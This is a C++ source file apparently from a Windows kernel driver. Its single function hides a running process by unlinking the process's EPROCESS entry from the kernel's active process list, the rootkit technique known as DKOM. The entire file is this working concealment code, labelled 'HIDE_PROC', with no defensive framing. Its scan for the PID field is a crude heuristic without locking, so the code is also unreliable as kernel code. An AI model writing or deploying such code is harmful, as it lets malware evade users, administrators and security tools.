#include "ProcessHandler.h"

NTSTATUS ProcessHandler::UnlinkActiveProcessLinks(ULONG pid) {
	NTSTATUS status;
	PEPROCESS EProc;
	PLIST_ENTRY PrevListEntry, NextListEntry, CurrListEntry;


	//Get EPROCESS structure.
	status = PsLookupProcessByProcessId((HANDLE)pid, &EProc);

	if (!NT_SUCCESS(status)) {
		KdPrint(("HIDE_PROC: Failed to locate process by pid. code: (0x%08X)\n", status));
		return status;
	}

	KdPrint(("HIDE_PROC: EPROCESS struct addr: %p\n", EProc));

	PULONG procPtr = reinterpret_cast<PULONG>(EProc);

	CurrListEntry = nullptr;

	//Scan the structure for the PID field.
	for (ULONG i = 0; i < 0x2bc; i++)
	{
		if (procPtr[i] == pid)
		{
			//Calculate ActiveProcessLinks (located near PID).
			CurrListEntry = reinterpret_cast<PLIST_ENTRY>(&procPtr[i + 1]);
			KdPrint(("HIDE_PROC: LIST_ENTRY struct at: %p\n", CurrListEntry));
			break;
		}
	}

	if (!CurrListEntry)
		return STATUS_UNSUCCESSFUL;

	PrevListEntry = CurrListEntry->Blink;
	NextListEntry = CurrListEntry->Flink;

	// Unlink target process from processes near in linked list.

	PrevListEntry->Flink = CurrListEntry->Flink;
	NextListEntry->Blink = CurrListEntry->Blink;

	// Point Flink and Blink to self.

	CurrListEntry->Flink = CurrListEntry;
	CurrListEntry->Blink = CurrListEntry;

	//Decrease reference count of EPROCESS object.

	ObDereferenceObject(EProc);

	status = STATUS_SUCCESS;
	return status;

}